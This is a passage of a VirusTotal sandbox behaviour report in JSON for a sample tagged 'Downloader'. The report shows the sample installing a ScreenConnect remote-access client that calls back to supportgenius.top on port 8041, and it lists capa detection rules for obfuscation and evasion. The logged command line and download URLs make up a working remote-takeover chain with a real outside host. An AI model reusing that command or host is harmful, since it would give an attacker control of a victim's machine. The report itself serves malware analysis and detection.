{
    "data": [
        {
            "id": "48419c4d9059c994e8ab17a2d3948634388dc61fc282431b380c2c76f2d3f114_C2AE",
            "type": "file_behaviour",
            "links": {
                "self": "https://www.virustotal.com/api/v3/file_behaviours/48419c4d9059c994e8ab17a2d3948634388dc61fc282431b380c2c76f2d3f114_C2AE"
            },
            "attributes": {
                "verdict_labels": [
                    "Downloader"
                ],
                "analysis_date": 1704660699,
                "ip_traffic": [
                    {
                        "transport_layer_protocol": "TCP",
                        "destination_ip": "192.3.101.150",
                        "destination_port": 8041
                    }
                ],
                "sandbox_name": "C2AE",
                "behash": "756b341032dfb609cd015a71b59c49f7",
                "command_executions": [
                    "%SAMPLEPATH%",
                    "\"%windir%\\Microsoft.NET\\Framework64\\v4.0.30319\\dfsvc.exe\"",
                    "\"%LOCALAPPDATA%\\Apps\\2.0\\7K2MLTQX.5Y7\\KDJ214CA.PHR\\scre..tion_25b0fbb6ef7eb094_0017.0002_0a4ab483025f189d\\ScreenConnect.WindowsClient.exe\"",
                    "\"%LOCALAPPDATA%\\Apps\\2.0\\7K2MLTQX.5Y7\\KDJ214CA.PHR\\scre..tion_25b0fbb6ef7eb094_0017.0002_0a4ab483025f189d\\ScreenConnect.ClientService.exe\" \"?y=Guest&h=supportgenius.top&p=8041&s=76d5c7b6-578e-439b-adb5-6c0f3b36f17a&k=BgIAAACkAABSU0ExAAgAAAEAAQBVXsSEc%2bx9uXD3C%2f7hA6k%2bCkYq8qNt9ddXTDuk6xtcDXcigKgagdDrv%2fcdVObs%2b5PsIEqa3J7G2KVNlw%2fruJmp5gWKLUA7CGK0M2xYP%2fnHrh8PGKb6APgX8%2bMmK%2fRI%2fuG1ObyHzrZSA2zDxqMWtbhBTbrYOR9GzyZRtT2sHBbUlx41DAcKHlRcqgqrm7UWwNY1mXMg1RfS2uCkTVjdU3GL7AKxo9LZAF%2bNZ31xMPej0IfTdjxJIuBFFPQhiLUl3MrrnM%2bcDzOJ4R5qzkEDJux1InHPO4447uQgY2C%2fpH9XXbyUJCVvgFFCPS5LSQJiQ7CvgPW3fKiAsEahrr56vu2y&r=&i=Untitled%20Session\" \"1\""
                ],
                "has_memdump": false,
                "processes_terminated": [
                    "%windir%\\System32\\svchost.exe -k WerSvcGroup",
                    "%windir%\\system32\\WerFault.exe -u -p 2548 -s 700",
                    "wmiadap.exe /F /T /R",
                    "%SAMPLEPATH%",
                    "\"%LOCALAPPDATA%\\Apps\\2.0\\7K2MLTQX.5Y7\\KDJ214CA.PHR\\scre..tion_25b0fbb6ef7eb094_0017.0002_0a4ab483025f189d\\ScreenConnect.WindowsClient.exe\"",
                    "\"%LOCALAPPDATA%\\Apps\\2.0\\7K2MLTQX.5Y7\\KDJ214CA.PHR\\scre..tion_25b0fbb6ef7eb094_0017.0002_0a4ab483025f189d\\ScreenConnect.ClientService.exe\" \"?y=Guest&h=supportgenius.top&p=8041&s=76d5c7b6-578e-439b-adb5-6c0f3b36f17a&k=BgIAAACkAABSU0ExAAgAAAEAAQBVXsSEc%2bx9uXD3C%2f7hA6k%2bCkYq8qNt9ddXTDuk6xtcDXcigKgagdDrv%2fcdVObs%2b5PsIEqa3J7G2KVNlw%2fruJmp5gWKLUA7CGK0M2xYP%2fnHrh8PGKb6APgX8%2bMmK%2fRI%2fuG1ObyHzrZSA2zDxqMWtbhBTbrYOR9GzyZRtT2sHBbUlx41DAcKHlRcqgqrm7UWwNY1mXMg1RfS2uCkTVjdU3GL7AKxo9LZAF%2bNZ31xMPej0IfTdjxJIuBFFPQhiLUl3MrrnM%2bcDzOJ4R5qzkEDJux1InHPO4447uQgY2C%2fpH9XXbyUJCVvgFFCPS5LSQJiQ7CvgPW3fKiAsEahrr56vu2y&r=&i=Untitled%20Session\" \"1\"",
                    "\"%LOCALAPPDATA%\\Apps\\2.0\\7K2MLTQX.5Y7\\KDJ214CA.PHR\\scre..tion_25b0fbb6ef7eb094_0017.0002_0a4ab483025f189d\\ScreenConnect.WindowsClient.exe\" \"RunRole\" \"0cf0111c-e41f-4122-9c86-21f054c7c53e\" \"System\""
                ],
                "verdict_confidence": 50,
                "dns_lookups": [
                    {
                        "resolved_ips": [
                            "192.3.101.150"
                        ],
                        "hostname": "supportgenius.top"
                    }
                ],
                "has_html_report": false,
                "last_modification_date": 1704779575,
                "has_pcap": false,
                "processes_tree": [
                    {
                        "process_id": "2244",
                        "name": "%windir%\\System32\\svchost.exe -k WerSvcGroup",
                        "children": [
                            {
                                "process_id": "2856",
                                "name": "%windir%\\system32\\WerFault.exe -u -p 2548 -s 700"
                            }
                        ]
                    },
                    {
                        "process_id": "1156",
                        "name": "wmiadap.exe /F /T /R"
                    },
                    {
                        "process_id": "2208",
                        "name": "%windir%\\system32\\wbem\\wmiprvse.exe"
                    },
                    {
                        "process_id": "2612",
                        "name": "%SAMPLEPATH%",
                        "children": [
                            {
                                "process_id": "2704",
                                "name": "\"%windir%\\Microsoft.NET\\Framework64\\v4.0.30319\\dfsvc.exe\"",
                                "children": [
                                    {
                                        "process_id": "2872",
                                        "time_offset": 23,
                                        "name": "\"%LOCALAPPDATA%\\Apps\\2.0\\7K2MLTQX.5Y7\\KDJ214CA.PHR\\scre..tion_25b0fbb6ef7eb094_0017.0002_0a4ab483025f189d\\ScreenConnect.WindowsClient.exe\"",
                                        "children": [
                                            {
                                                "process_id": "2912",
                                                "time_offset": 24,
                                                "name": "\"%LOCALAPPDATA%\\Apps\\2.0\\7K2MLTQX.5Y7\\KDJ214CA.PHR\\scre..tion_25b0fbb6ef7eb094_0017.0002_0a4ab483025f189d\\ScreenConnect.ClientService.exe\" \"?y=Guest&h=supportgenius.top&p=8041&s=76d5c7b6-578e-439b-adb5-6c0f3b36f17a&k=BgIAAACkAABSU0ExAAgAAAEAAQBVXsSEc%2bx9uXD3C%2f7hA6k%2bCkYq8qNt9ddXTDuk6xtcDXcigKgagdDrv%2fcdVObs%2b5PsIEqa3J7G2KVNlw%2fruJmp5gWKLUA7CGK0M2xYP%2fnHrh8PGKb6APgX8%2bMmK%2fRI%2fuG1ObyHzrZSA2zDxqMWtbhBTbrYOR9GzyZRtT2sHBbUlx41DAcKHlRcqgqrm7UWwNY1mXMg1RfS2uCkTVjdU3GL7AKxo9LZAF%2bNZ31xMPej0IfTdjxJIuBFFPQhiLUl3MrrnM%2bcDzOJ4R5qzkEDJux1InHPO4447uQgY2C%2fpH9XXbyUJCVvgFFCPS5LSQJiQ7CvgPW3fKiAsEahrr56vu2y&r=&i=Untitled%20Session\" \"1\""
                                            }
                                        ]
                                    }
                                ]
                            }
                        ]
                    },
                    {
                        "process_id": "2164",
                        "name": "\"%LOCALAPPDATA%\\Apps\\2.0\\7K2MLTQX.5Y7\\KDJ214CA.PHR\\scre..tion_25b0fbb6ef7eb094_0017.0002_0a4ab483025f189d\\ScreenConnect.WindowsClient.exe\" \"RunRole\" \"0cf0111c-e41f-4122-9c86-21f054c7c53e\" \"System\""
                    }
                ],
                "http_conversations": [
                    {
                        "url": "https://supportgenius.top:443/Bin/ScreenConnect.Client.application?y=Guest&h=supportgenius.top&p=8041&s=76d5c7b6-578e-439b-adb5-6c0f3b36f17a&k=BgIAAACkAABSU0ExAAgAAAEAAQBVXsSEc%2bx9uXD3C%2f7hA6k%2bCkYq8qNt9ddXTDuk6xtcDXcigKgagdDrv%2fcdVObs%2b5PsIEqa3J7G2KVNlw%2fruJmp5gWKLUA7CGK0M2xYP%2fnHrh8PGKb6APgX8%2bMmK%2fRI%2fuG1ObyHzrZSA2zDxqMWtbhBTbrYOR9GzyZRtT2sHBbUlx41DAcKHlRcqgqrm7UWwNY1mXMg1RfS2uCkTVjdU3GL7AKxo9LZAF%2bNZ31xMPej0IfTdjxJIuBFFPQhiLUl3MrrnM%2bcDzOJ4R5qzkEDJux1InHPO4447uQgY2C%2fpH9XXbyUJCVvgFFCPS5LSQJiQ7CvgPW3fKiAsEahrr56vu2y&r=&i=Untitled%20Session",
                        "request_method": "GET",
                        "response_status_code": 200,
                        "response_headers": {
                            "Transfer-Encoding": "chunked",
                            "Server": "ScreenConnect/23.2.9.8466-3771004569 Microsoft-HTTPAPI/2.0",
                            "Connection": "close",
                            "Cache-Control": "private",
                            "Date": "Sun, 07 Jan 2024 20:46:53 GMT",
                            "Content-Type": "application/x-ms-application; charset=utf-8"
                        }
                    },
                    {
                        "url": "https://supportgenius.top:443/Bin/ScreenConnect.Client.manifest",
                        "request_method": "GET",
                        "response_status_code": 200,
                        "response_headers": {
                            "Transfer-Encoding": "chunked",
                            "Server": "ScreenConnect/23.2.9.8466-3771004569 Microsoft-HTTPAPI/2.0",
                            "Connection": "close",
                            "Cache-Control": "private",
                            "Date": "Sun, 07 Jan 2024 20:46:54 GMT",
                            "Content-Type": "text/html"
                        }
                    },
                    {
                        "url": "http://cacerts.digicert.com/DigiCertTrustedRootG4.crt",
                        "request_method": "GET",
                        "response_status_code": 200,
                        "response_headers": {
                            "X-Cache": "HIT",
                            "Age": "152512",
                            "Expires": "Tue, 09 Jan 2024 20:46:55 GMT",
                            "Server": "ECAcc (tkc/BE91)",
                            "Last-Modified": "Wed, 06 Dec 2017 21:41:43 GMT",
                            "Etag": "\"5a286417-594\"",
                            "Cache-Control": "max-age=172800, public",
                            "Date": "Sun, 07 Jan 2024 20:46:55 GMT",
                            "Content-Type": "application/pkix-cert",
                            "Accept-Ranges": "bytes"
                        },
                        "request_headers": {
                            "Accept": "*/*",
                            "User-Agent": "Microsoft-CryptoAPI/6.1"
                        }
                    },
                    {
                        "url": "http://cacerts.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crt",
                        "request_method": "GET",
                        "response_status_code": 200,
                        "response_headers": {
                            "X-Cache": "HIT",
                            "Age": "155850",
                            "Expires": "Tue, 09 Jan 2024 20:46:55 GMT",
                            "Server": "ECAcc (tkc/BEE0)",
                            "Last-Modified": "Mon, 03 May 2021 17:17:22 GMT",
                            "Etag": "\"60903022-6b4\"",
                            "Cache-Control": "max-age=172800, public",
                            "Date": "Sun, 07 Jan 2024 20:46:55 GMT",
                            "Content-Type": "application/pkix-cert",
                            "Accept-Ranges": "bytes"
                        },
                        "request_headers": {
                            "Accept": "*/*",
                            "User-Agent": "Microsoft-CryptoAPI/6.1"
                        }
                    },
                    {
                        "url": "https://supportgenius.top:443/Bin/ScreenConnect.ClientService.exe",
                        "request_method": "GET",
                        "response_status_code": 200,
                        "response_headers": {
                            "Transfer-Encoding": "chunked",
                            "Server": "ScreenConnect/23.2.9.8466-3771004569 Microsoft-HTTPAPI/2.0",
                            "Connection": "close",
                            "Cache-Control": "private",
                            "Date": "Sun, 07 Jan 2024 20:46:56 GMT",
                            "Content-Type": "text/html"
                        }
                    },
                    {
                        "url": "https://supportgenius.top:443/Bin/ScreenConnect.WindowsBackstageShell.exe",
                        "request_method": "GET",
                        "response_status_code": 200,
                        "response_headers": {
                            "Transfer-Encoding": "chunked",
                            "Server": "ScreenConnect/23.2.9.8466-3771004569 Microsoft-HTTPAPI/2.0",
                            "Connection": "close",
                            "Cache-Control": "private",
                            "Date": "Sun, 07 Jan 2024 20:46:56 GMT",
                            "Content-Type": "text/html"
                        }
                    },
                    {
                        "url": "https://supportgenius.top:443/Bin/ScreenConnect.WindowsClient.exe.config",
                        "request_method": "GET",
                        "response_status_code": 200,
                        "response_headers": {
                            "Transfer-Encoding": "chunked",
                            "Server": "ScreenConnect/23.2.9.8466-3771004569 Microsoft-HTTPAPI/2.0",
                            "Connection": "close",
                            "Cache-Control": "private",
                            "Date": "Sun, 07 Jan 2024 20:46:57 GMT",
                            "Content-Type": "text/html"
                        }
                    },
                    {
                        "url": "https://supportgenius.top:443/Bin/ScreenConnect.WindowsBackstageShell.exe.config",
                        "request_method": "GET",
                        "response_status_code": 200,
                        "response_headers": {
                            "Transfer-Encoding": "chunked",
                            "Server": "ScreenConnect/23.2.9.8466-3771004569 Microsoft-HTTPAPI/2.0",
                            "Connection": "close",
                            "Cache-Control": "private",
                            "Date": "Sun, 07 Jan 2024 20:46:57 GMT",
                            "Content-Type": "text/html"
                        }
                    },
                    {
                        "url": "https://supportgenius.top:443/Bin/ScreenConnect.Windows.dll",
                        "request_method": "GET",
                        "response_status_code": 200,
                        "response_headers": {
                            "Transfer-Encoding": "chunked",
                            "Server": "ScreenConnect/23.2.9.8466-3771004569 Microsoft-HTTPAPI/2.0",
                            "Connection": "close",
                            "Cache-Control": "private",
                            "Date": "Sun, 07 Jan 2024 20:46:59 GMT",
                            "Content-Type": "text/html"
                        }
                    },
                    {
                        "url": "https://supportgenius.top:443/Bin/ScreenConnect.ClientService.dll",
                        "request_method": "GET",
                        "response_status_code": 200,
                        "response_headers": {
                            "Transfer-Encoding": "chunked",
                            "Server": "ScreenConnect/23.2.9.8466-3771004569 Microsoft-HTTPAPI/2.0",
                            "Connection": "close",
                            "Cache-Control": "private",
                            "Date": "Sun, 07 Jan 2024 20:47:08 GMT",
                            "Content-Type": "text/html"
                        }
                    },
                    {
                        "url": "https://supportgenius.top:443/Bin/ScreenConnect.WindowsClient.exe",
                        "request_method": "GET",
                        "response_status_code": 200,
                        "response_headers": {
                            "Transfer-Encoding": "chunked",
                            "Server": "ScreenConnect/23.2.9.8466-3771004569 Microsoft-HTTPAPI/2.0",
                            "Connection": "close",
                            "Cache-Control": "private",
                            "Date": "Sun, 07 Jan 2024 20:47:08 GMT",
                            "Content-Type": "text/html"
                        }
                    },
                    {
                        "url": "https://supportgenius.top:443/Bin/ScreenConnect.Client.dll",
                        "request_method": "GET",
                        "response_status_code": 200,
                        "response_headers": {
                            "Transfer-Encoding": "chunked",
                            "Server": "ScreenConnect/23.2.9.8466-3771004569 Microsoft-HTTPAPI/2.0",
                            "Connection": "close",
                            "Cache-Control": "private",
                            "Date": "Sun, 07 Jan 2024 20:47:11 GMT",
                            "Content-Type": "text/html"
                        }
                    },
                    {
                        "url": "https://supportgenius.top:443/Bin/ScreenConnect.Core.dll",
                        "request_method": "GET",
                        "response_status_code": 200,
                        "response_headers": {
                            "Transfer-Encoding": "chunked",
                            "Server": "ScreenConnect/23.2.9.8466-3771004569 Microsoft-HTTPAPI/2.0",
                            "Connection": "close",
                            "Cache-Control": "private",
                            "Date": "Sun, 07 Jan 2024 20:47:12 GMT",
                            "Content-Type": "text/html"
                        }
                    }
                ],
                "has_evtx": false
            }
        },
        {
            "id": "48419c4d9059c994e8ab17a2d3948634388dc61fc282431b380c2c76f2d3f114_CAPA",
            "type": "file_behaviour",
            "links": {
                "self": "https://www.virustotal.com/api/v3/file_behaviours/48419c4d9059c994e8ab17a2d3948634388dc61fc282431b380c2c76f2d3f114_CAPA"
            },
            "attributes": {
                "mitre_attack_techniques": [
                    {
                        "refs": [
                            {
                                "ref": "#signature_matches",
                                "value": "contain obfuscated stackstrings"
                            }
                        ],
                        "signature_description": "contain obfuscated stackstrings",
                        "id": "T1027.005",
                        "severity": "IMPACT_SEVERITY_INFO"
                    },
                    {
                        "refs": [
                            {
                                "ref": "#signature_matches",
                                "value": "link function at runtime on Windows"
                            }
                        ],
                        "signature_description": "link function at runtime on Windows",
                        "id": "T1129",
                        "severity": "IMPACT_SEVERITY_INFO"
                    },
                    {
                        "refs": [
                            {
                                "ref": "#signature_matches",
                                "value": "parse PE header"
                            }
                        ],
                        "signature_description": "parse PE header",
                        "id": "T1129",
                        "severity": "IMPACT_SEVERITY_INFO"
                    }
                ],
                "signature_matches": [
                    {
                        "authors": [
                            "michael.hunhoff@mandiant.com",
                            "joakim@intezer.com"
                        ],
                        "rule_src": "rule:\n  meta:\n    name: create or open file\n    authors:\n      - michael.hunhoff@mandiant.com\n      - joakim@intezer.com\n    lib: true\n    scope: basic block\n    mbc:\n      - File System::Create File [C0016]\n    examples:\n      - B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x401D7E\n  features:\n    - or:\n      - api: CreateFile\n      - api: CreateFileEx\n      - api: IoCreateFile\n      - api: IoCreateFileEx\n      - api: ZwOpenFile\n      - api: ZwCreateFile\n      - api: NtOpenFile\n      - api: NtCreateFile\n      - api: LZCreateFile\n      - api: LZOpenFile\n      - api: fopen\n      - api: fopen64\n      - api: fdopen\n      - api: freopen\n      - api: open\n      - api: openat\n",
                        "name": "create or open file",
                        "format": "SIG_FORMAT_CAPA"
                    },
                    {
                        "description": "anti-analysis/obfuscation/string/stackstring",
                        "authors": [
                            "moritz.raabe@mandiant.com"
                        ],
                        "rule_src": "rule:\n  meta:\n    name: contain obfuscated stackstrings\n    namespace: anti-analysis/obfuscation/string/stackstring\n    authors:\n      - moritz.raabe@mandiant.com\n    scope: basic block\n    att&ck:\n      - Defense Evasion::Obfuscated Files or Information::Indicator Removal from Tools [T1027.005]\n    mbc:\n      - Anti-Static Analysis::Executable Code Obfuscation::Argument Obfuscation [B0032.020]\n      - Anti-Static Analysis::Executable Code Obfuscation::Stack Strings [B0032.017]\n    examples:\n      - Practical Malware Analysis Lab 16-03.exe_:0x4013D0\n  features:\n    - characteristic: stack string\n",
                        "name": "contain obfuscated stackstrings",
                        "format": "SIG_FORMAT_CAPA"
                    },
                    {
                        "refs": [
                            {
                                "ref": "https://docs.microsoft.com/en-us/windows/win32/sync/wait-functions"
                            },
                            {
                                "ref": "https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/TimingAttacks/timing.cpp"
                            }
                        ],
                        "authors": [
                            "michael.hunhoff@mandiant.com",
                            "@ramen0x3f"
                        ],
                        "rule_src": "rule:\n  meta:\n    name: delay execution\n    authors:\n      - michael.hunhoff@mandiant.com\n      - \"@ramen0x3f\"\n    lib: true\n    scope: basic block\n    mbc:\n      - Anti-Behavioral Analysis::Dynamic Analysis Evasion::Delayed Execution [B0003.003]\n    references:\n      - https://docs.microsoft.com/en-us/windows/win32/sync/wait-functions\n      - https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/TimingAttacks/timing.cpp\n    examples:\n      - al-khaser_x86.exe_:0x449770\n      - B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x402FA6\n  features:\n    - or:\n      - and:\n        - os: windows\n        - or:\n          - api: kernel32.Sleep\n          - api: kernel32.SleepEx\n          - api: kernel32.WaitForSingleObject\n          - api: kernel32.SignalObjectAndWait\n          - api: kernel32.WaitForSingleObjectEx\n          - api: kernel32.WaitForMultipleObjects\n          - api: kernel32.WaitForMultipleObjectsEx\n          - api: kernel32.RegisterWaitForSingleObject\n          - api: WaitOnAddress\n          - api: user32.MsgWaitForMultipleObjects\n          - api: user32.MsgWaitForMultipleObjectsEx\n          - api: NtDelayExecution\n          - api: KeWaitForSingleObject\n          - api: KeDelayExecutionThread\n      - and:\n        - os: linux\n        - or:\n          - api: sleep\n          - api: usleep\n",
                        "name": "delay execution",
                        "format": "SIG_FORMAT_CAPA"
                    },
                    {
                        "authors": [
                            "moritz.raabe@mandiant.com"
                        ],
                        "rule_src": "rule:\n  meta:\n    name: contain loop\n    authors:\n      - moritz.raabe@mandiant.com\n    lib: true\n    scope: function\n    examples:\n      - 08AC667C65D36D6542917655571E61C8:0x406EAA\n  features:\n    - or:\n      - characteristic: loop\n      - characteristic: tight loop\n      - characteristic: recursive call\n",
                        "name": "contain loop",
                        "format": "SIG_FORMAT_CAPA"
                    },
                    {
                        "description": "linking/runtime-linking",
                        "authors": [
                            "moritz.raabe@mandiant.com",
                            "michael.hunhoff@mandiant.com"
                        ],
                        "rule_src": "rule:\n  meta:\n    name: link function at runtime on Windows\n    namespace: linking/runtime-linking\n    authors:\n      - moritz.raabe@mandiant.com\n      - michael.hunhoff@mandiant.com\n    scope: function\n    att&ck:\n      - Execution::Shared Modules [T1129]\n    examples:\n      - 9324D1A8AE37A36AE560C37448C9705A:0x404130\n      - Practical Malware Analysis Lab 01-04.exe_:0x401350\n  features:\n    - and:\n      - os: windows\n      - or:\n        - api: kernel32.GetProcAddress\n        - api: ntdll.LdrGetProcedureAddress\n      - optional:\n        - characteristic: indirect call\n        - api: kernel32.LoadLibrary\n        - api: kernel32.GetModuleHandle\n        - api: kernel32.GetModuleHandleEx\n        - api: ntdll.LdrLoadDll\n",
                        "name": "link function at runtime on Windows",
                        "format": "SIG_FORMAT_CAPA"
                    },
                    {
                        "description": "host-interaction/file-system/read",
                        "authors": [
                            "moritz.raabe@mandiant.com",
                            "anushka.virgaonkar@mandiant.com"
                        ],
                        "rule_src": "rule:\n  meta:\n    name: read file on Windows\n    namespace: host-interaction/file-system/read\n    authors:\n      - moritz.raabe@mandiant.com\n      - anushka.virgaonkar@mandiant.com\n    scope: function\n    mbc:\n      - File System::Read File [C0051]\n    examples:\n      - BFB9B5391A13D0AFD787E87AB90F14F5:0x1314567B\n  features:\n    - or:\n      - and:\n        - os: windows\n        - optional:\n          - and:\n            - number: 0x80000000 = GENERIC_READ\n            - match: create or open file\n        - or:\n          - api: kernel32.ReadFile\n          - api: ReadFileEx\n          - api: NtReadFile\n          - api: ZwReadFile\n          - api: LZRead\n          - api: _read\n          - api: fread\n      - api: System.IO.File::ReadAllBytes\n      - api: System.IO.File::ReadAllBytesAsync\n      - api: System.IO.File::ReadAllLines\n      - api: System.IO.File::ReadAllLinesAsync\n      - api: System.IO.File::ReadAllText\n      - api: System.IO.File::ReadAllTextAsync\n      - api: System.IO.File::ReadLines\n",
                        "name": "read file on Windows",
                        "format": "SIG_FORMAT_CAPA"
                    },
                    {
                        "description": "load-code/pe",
                        "authors": [
                            "moritz.raabe@mandiant.com"
                        ],
                        "rule_src": "rule:\n  meta:\n    name: parse PE header\n    namespace: load-code/pe\n    authors:\n      - moritz.raabe@mandiant.com\n    scope: function\n    att&ck:\n      - Execution::Shared Modules [T1129]\n    examples:\n      - 9324D1A8AE37A36AE560C37448C9705A:0x403DD0\n  features:\n    - and:\n      - os: windows\n      - and:\n        - mnemonic: cmp\n        - or:\n          - number: 0x4550 = IMAGE_NT_SIGNATURE (PE)\n          - and:\n            - number: 0x50\n            - number: 0x45\n        - or:\n          - number: 0x5A4D = IMAGE_DOS_SIGNATURE (MZ)\n          - and:\n            - number: 0x4D\n            - number: 0x5A\n        - optional:\n          - and:\n            - operand[1].offset: 0x3C = IMAGE_DOS_HEADER.e_lfanew\n            - or:\n              - and:\n                - arch: i386\n                - operand[1].offset: 0x50 = IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage\n                - operand[1].offset: 0x34 = IMAGE_NT_HEADERS.OptionalHeader.ImageBase\n              - and:\n                - arch: amd64\n                - operand[1].offset: 0x50 = IMAGE_NT_HEADERS64.OptionalHeader.SizeOfImage\n                - operand[1].offset: 0x30 = IMAGE_NT_HEADERS64.OptionalHeader.ImageBase\n          - basic block:\n            - and:\n              - operand[1].offset: 0x3C = IMAGE_DOS_HEADER.e_lfanew\n              - 3 or more:\n                - operand[1].offset: 0x4 = IMAGE_NT_HEADERS.FileHeader.Machine\n                - operand[1].offset: 0x6 = IMAGE_NT_HEADERS.FileHeader.NumberOfSections\n                - operand[1].offset: 0x14 = IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader\n                - operand[1].offset: 0x16 = IMAGE_NT_HEADERS.FileHeader.Characteristics\n                - operand[1].offset: 0x28 = IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint  # for 32 and 64 bit\n                - or:\n                  - and:\n                    - arch: i386\n                    - operand[1].offset: 0x34 = IMAGE_NT_HEADERS.OptionalHeader.ImageBase\n                    - operand[1].offset: 0x50 = IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage\n                  - and:\n                    - arch: amd64\n                    - operand[1].offset: 0x30 = IMAGE_NT_HEADERS.OptionalHeader.ImageBase\n                    - operand[1].offset: 0x50 = IMAGE_NT_HEADERS64.OptionalHeader.SizeOfImage\n",
                        "name": "parse PE header",
                        "format": "SIG_FORMAT_CAPA"
                    },
                    {
                        "description": "executable/pe/pdb",
                        "authors": [
                            "moritz.raabe@mandiant.com"
                        ],
                        "rule_src": "rule:\n  meta:\n    name: contains PDB path\n    namespace: executable/pe/pdb\n    authors:\n      - moritz.raabe@mandiant.com\n    scope: file\n    examples:\n      - 464EF2CA59782CE697BC329713698CCC  # level32.exe\n  features:\n    - string: /:\\\\.*\\.pdb/\n",
                        "name": "contains PDB path",
                        "format": "SIG_FORMAT_CAPA"
                    },
                    {
                        "format": "SIG_FORMAT_CAPA",
                        "rule_src": "rule:\n  meta:\n    name: create or open file\n    authors:\n      - michael.hunhoff@mandiant.com\n      - joakim@intezer.com\n    lib: true\n    scopes:\n      static: basic block\n      dynamic: call\n    mbc:\n      - File System::Create File [C0016]\n    examples:\n      - B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x401D7E\n  features:\n    - or:\n      - api: CreateFile\n      - api: CreateFileEx\n      - api: IoCreateFile\n      - api: IoCreateFileEx\n      - api: ZwOpenFile\n      - api: ZwCreateFile\n      - api: NtOpenFile\n      - api: NtCreateFile\n      - api: LZCreateFile\n      - api: LZOpenFile\n      - api: fopen\n      - api: fopen64\n      - api: fdopen\n      - api: freopen\n      - api: open\n      - api: openat\n",
                        "name": "create or open file",
                        "authors": [
                            "michael.hunhoff@mandiant.com",
                            "joakim@intezer.com"
                        ]
                    },
                    {
                        "format": "SIG_FORMAT_CAPA",
                        "authors": [
                            "moritz.raabe@mandiant.com"
                        ],
                        "rule_src": "rule:\n  meta:\n    name: contain obfuscated stackstrings\n    namespace: anti-analysis/obfuscation/string/stackstring\n    authors:\n      - moritz.raabe@mandiant.com\n    scopes:\n      static: basic block\n      dynamic: unsupported\n    att&ck:\n      - Defense Evasion::Obfuscated Files or Information::Indicator Removal from Tools [T1027.005]\n    mbc:\n      - Anti-Static Analysis::Executable Code Obfuscation::Argument Obfuscation [B0032.020]\n      - Anti-Static Analysis::Executable Code Obfuscation::Stack Strings [B0032.017]\n    examples:\n      - Practical Malware Analysis Lab 16-03.exe_:0x4013D0\n  features:\n    - characteristic: stack string\n",
                        "name": "contain obfuscated stackstrings",
                        "description": "anti-analysis/obfuscation/string/stackstring"
                    },
                    {
                        "refs": [
                            {
                                "ref": "https://docs.microsoft.com/en-us/windows/win32/sync/wait-functions"
                            },
                            {
                                "ref": "https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/TimingAttacks/timing.cpp"
                            }
                        ],
                        "format": "SIG_FORMAT_CAPA",
                        "rule_src": "rule:\n  meta:\n    name: delay execution\n    authors:\n      - michael.hunhoff@mandiant.com\n      - \"@ramen0x3f\"\n    lib: true\n    scopes:\n      static: basic block\n      dynamic: call\n    mbc:\n      - Anti-Behavioral Analysis::Dynamic Analysis Evasion::Delayed Execution [B0003.003]\n    references:\n      - https://docs.microsoft.com/en-us/windows/win32/sync/wait-functions\n      - https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/TimingAttacks/timing.cpp\n    examples:\n      - al-khaser_x86.exe_:0x449770\n      - B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x402FA6\n  features:\n    - or:\n      - and:\n        - os: windows\n        - or:\n          - api: kernel32.Sleep\n          - api: kernel32.SleepEx\n          - api: kernel32.WaitForSingleObject\n          - api: kernel32.SignalObjectAndWait\n          - api: kernel32.WaitForSingleObjectEx\n          - api: kernel32.WaitForMultipleObjects\n          - api: kernel32.WaitForMultipleObjectsEx\n          - api: kernel32.RegisterWaitForSingleObject\n          - api: WaitOnAddress\n          - api: user32.MsgWaitForMultipleObjects\n          - api: user32.MsgWaitForMultipleObjectsEx\n          - api: NtDelayExecution\n          - api: KeWaitForSingleObject\n          - api: KeDelayExecutionThread\n      - and:\n        - os: linux\n        - or:\n          - api: sleep\n          - api: usleep\n",
                        "name": "delay execution",
                        "authors": [
                            "michael.hunhoff@mandiant.com",
                            "@ramen0x3f"
                        ]
                    },
                    {
                        "format": "SIG_FORMAT_CAPA",
                        "rule_src": "rule:\n  meta:\n    name: contain loop\n    authors:\n      - moritz.raabe@mandiant.com\n    lib: true\n    scopes:\n      static: function\n      dynamic: unsupported  # requires characteristic features\n    examples:\n      - 08AC667C65D36D6542917655571E61C8:0x406EAA\n  features:\n    - or:\n      - characteristic: loop\n      - characteristic: tight loop\n      - characteristic: recursive call\n",
                        "name": "contain loop",
                        "authors": [
                            "moritz.raabe@mandiant.com"
                        ]
                    },
                    {
                        "format": "SIG_FORMAT_CAPA",
                        "authors": [
                            "moritz.raabe@mandiant.com",
                            "michael.hunhoff@mandiant.com"
                        ],
                        "rule_src": "rule:\n  meta:\n    name: link function at runtime on Windows\n    namespace: linking/runtime-linking\n    authors:\n      - moritz.raabe@mandiant.com\n      - michael.hunhoff@mandiant.com\n    scopes:\n      static: function\n      dynamic: unsupported  # requires characteristic features\n    att&ck:\n      - Execution::Shared Modules [T1129]\n    examples:\n      - 9324D1A8AE37A36AE560C37448C9705A:0x404130\n      - Practical Malware Analysis Lab 01-04.exe_:0x401350\n  features:\n    - and:\n      - os: windows\n      - or:\n        - api: kernel32.GetProcAddress\n        - api: ntdll.LdrGetProcedureAddress\n      - optional:\n        - characteristic: indirect call\n        - api: kernel32.LoadLibrary\n        - api: kernel32.GetModuleHandle\n        - api: kernel32.GetModuleHandleEx\n        - api: ntdll.LdrLoadDll\n",
                        "name": "link function at runtime on Windows",
                        "description": "linking/runtime-linking"
                    },
                    {
                        "format": "SIG_FORMAT_CAPA",
                        "authors": [
                            "moritz.raabe@mandiant.com",
                            "anushka.virgaonkar@mandiant.com"
                        ],
